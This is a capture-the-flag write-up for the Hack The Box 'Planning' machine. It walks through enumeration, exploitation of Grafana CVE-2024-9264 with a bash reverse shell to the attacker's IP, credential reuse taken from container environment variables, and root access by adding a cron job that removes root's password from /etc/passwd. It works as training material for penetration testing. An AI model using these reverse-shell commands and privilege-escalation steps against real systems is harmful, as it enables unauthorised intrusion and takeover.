| **Machine**             | \[Planning]                                                                                                                  |
| :---------------------- | :------------------------------------------------------------------------------------------------------------------------------- |
| **Platform**            | Hack The Box                                                                                                                     |
| **Difficulty**          | Easy                                                                                                                           |
| **Key Vulnerabilities** | `Grafana RCE — CVE-2024-9264`, `Root Privileges via Cronjobs`, `Sensitive Environment Variable Disclosure `, `Docker container breakout ` |
| **Tools Used**          | `nmap, ffuf, Burp Suite, Python, nc, curl, env, ss, ssh`

**Machine Information**
As is common in real-life pentests, we begin the Planning machine with credentials:
`admin / 0D5oT70Fq13EvB5r`

# Enumeration
Running nmap, we discover two open ports SSH and HTTP.
```bash
└─$ sudo nmap -sCV 10.129.237.241 -p- --min-rate=1000 -oN nmap_long
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 10:55 EDT
Nmap scan report for 10.129.237.241
Host is up (0.035s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://planning.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.24 seconds

```
We see that the target is an Ubuntu box and a vhost from the nmap output "planning.htb", so i will add it to /etc/hosts file.
```bash
└─$ echo "10.129.237.241 planning.htb" | sudo tee -a /etc/hosts                               
10.129.237.241 planning.htb
```
Visiting the site shows an Education Courses platform:
<img width="3521" height="1487" alt="2025-08-05 170149" src="https://github.com/user-attachments/assets/1b262090-5631-4c41-a3bf-f680b0ea55be" />

While exploring manually, I also start fuzzing with .php extensions, we know the site is running PHP because all the directories end with .php
```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://planning.htb/FUZZ -c -e .php
```
So I find an interesting page: /detail.php, which allows enrolling in a course:
<img width="2808" height="1554" alt="2025-08-05 170546" src="https://github.com/user-attachments/assets/f2acf77e-9175-4dd8-86a5-5c86f0fe70ca" />

I wanted to check what it does in the background when i send a POST request, so i started burpsuite.

<img width="2145" height="1182" alt="2025-08-05 170701" src="https://github.com/user-attachments/assets/21cf0613-6a3f-4cab-941c-73419532b28e" />
There is also a POST requests we can send in the search function:

<img width="1962" height="864" alt="2025-08-05 171514" src="https://github.com/user-attachments/assets/15a2f469-21ca-4940-8bfa-751c81f7e8c6" />

Tried all the usual tricks on both — SQLi, LFI, etc. — but the response size was always the same. Backend probably not processing anything. Looks like dead ends.

Brute forcing virtual hosts with ffuf, found a new subdomain

```bash
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://10.129.237.241 -H "Host: FUZZ.planning.htb" -fs 178

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.237.241
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt
 :: Header           : Host: FUZZ.planning.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 62ms]

```
I added it to /etc/hosts file and visited the page

<img width="1713" height="1347" alt="2025-08-05 174743" src="https://github.com/user-attachments/assets/8aba3805-7b11-4188-ba83-e246ff48c7fb" />

# Foothold
I noticed the Grafana version at the bottom of the page. Searching online, I found
>CVE-2024-9264
A vulnerability in Grafana's Cloud Migration Assistant allowing privilege escalation between organizations.

and a working PoC at https://github.com/nollium/CVE-2024-9264, lets clone the repo and ran the exploit.
```bash
└─$ python3 CVE-2024-9264.py        
usage: CVE-2024-9264.py [-h] [-u USER] [-p PASSWORD] [-f FILE] [-q QUERY] [-c COMMAND] url
CVE-2024-9264.py: error: the following arguments are required: url

```

Using the provided credentials for the Machine `admin / 0D5oT70Fq13EvB5r`, I executed the script while listening on port 9002:
```bash
└─$ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c 'bash -c "/bin/bash -i >& /dev/tcp/10.10.14.73/9002 0>&1"'  http://grafana.planning.htb 
[+] Logged in as admin:0D5oT70Fq13EvB5r                                                                                                
[+] Executing command: bash -c "/bin/bash -i >& /dev/tcp/10.10.14.73/9002 0>&1"       
```

Got a shell back. Shows as root, but it’s a Docker container.

```bash
└─$ nc -lvnp 9002                                                                                                                                        
listening on [any] 9002 ...
connect to [10.10.14.73] from (UNKNOWN) [10.129.237.241] 46612
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell           
root@7ce659d667d7:~# ls                    
```
While doing some basic enumeration stuff, i ran `env` to check environment variables  and found credentials:

<img width="1661" height="630" alt="2025-08-05 180639" src="https://github.com/user-attachments/assets/f565149e-dbdf-4919-93a4-02d58dbb4aca" />

Tried those creds with SSH on the main host - success. We’re enzo@planning. First flag done.
<img width="1730" height="1072" alt="2025-08-05 180929" src="https://github.com/user-attachments/assets/e784c69a-6633-4e36-9aa0-941de90f2b7a" />

# Privilege Escalation
Started with basics as always. Nothing in sudo -l, no processes are running.

```bash
enzo@planning:~$ ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
enzo        3296  0.0  0.2   8668  5504 pts/0    Ss   16:08   0:00 -bash
enzo        3613  0.0  0.2  10884  4352 pts/0    R+   16:24   0:00 ps auxww

```
Found a /opt/crontabs/ directory with a crontab.db file insid

<img width="3798" height="117" alt="2025-08-05 182619" src="https://github.com/user-attachments/assets/be0aa2d1-bfc2-4c88-bb62-e390934612af" />

The script does:

    1. Saves the Docker image as a .tar

    2. Compresses it

    3. Archives it to a password-protected .zip (P4ssw0rdS0pRi0T3c)

    4. Deletes the unencrypted file

    5. Runs /root/scripts/cleanup.sh every minute

I couldn’t read the cleanup.sh file because its in /root directory.
Checking for local services i find mysql on port 3306, probably grafana proxy on port 3000 and an unknown port 8000

```bash 
enzo@planning:~$ ss -tlnp
State                           Recv-Q                          Send-Q                                                    Local Address:Port                                                      Peer Address:Port                          Process                          
LISTEN                          0                               4096                                                          127.0.0.1:45811                                                          0.0.0.0:*                                                              
LISTEN                          0                               511                                                           127.0.0.1:8000                                                           0.0.0.0:*                                                              
LISTEN                          0                               4096                                                         127.0.0.54:53                                                             0.0.0.0:*                                                              
LISTEN                          0                               4096                                                          127.0.0.1:3000                                                           0.0.0.0:*                                                              
LISTEN                          0                               151                                                           127.0.0.1:3306                                                           0.0.0.0:*                                                              
LISTEN                          0                               4096                                                      127.0.0.53%lo:53                                                             0.0.0.0:*                                                              
LISTEN                          0                               70                                                            127.0.0.1:33060                                                          0.0.0.0:*                                                              
LISTEN                          0                               511                                                             0.0.0.0:80                                                             0.0.0.0:*                                                              
LISTEN                          0                               4096                                                                  *:22                                                                   *:*          
```

I couldn`t access port 8000 with curl within the machine, so i port-forwarded it to my local kali machine.
```bash
└─$ ssh -L 8000:localhost:8000 enzo@planning.htb
```
Visiting the page I`m asked for credentials.
<img width="1221" height="780" alt="2025-08-05 190037" src="https://github.com/user-attachments/assets/6a806db2-6e8c-4d6a-8f92-fe1dccf31e50" />

I tried all the credentials we have found earlier, and the one in the crontab.db script worked.

<img width="3794" height="843" alt="2025-08-05 190856" src="https://github.com/user-attachments/assets/a72ca24e-6fb5-4778-8bb8-6ba30d3ea08f" />
It’s a Crontab GUI, and based on the /opt/crontabs/crontab.db, it's runs as root.

From here its pretty easy, I will add a simply entry that modifies the /etc/passwd file to remove root password
<img width="1205" height="1163" alt="2025-08-05 194444" src="https://github.com/user-attachments/assets/ad7768f8-9d0b-41fd-b738-ebbc3d65be60" />

Waited a bit and then checked /etc/passwd. It worked. 

<img width="654" height="105" alt="2025-08-05 194544" src="https://github.com/user-attachments/assets/005b957c-a160-4ff4-88a2-f9449fd3e6f8" />

We are root. GG

<img width="642" height="174" alt="2025-08-05 194610" src="https://github.com/user-attachments/assets/ace2aa34-c8b8-4f73-bf26-ec4dafa10432" />

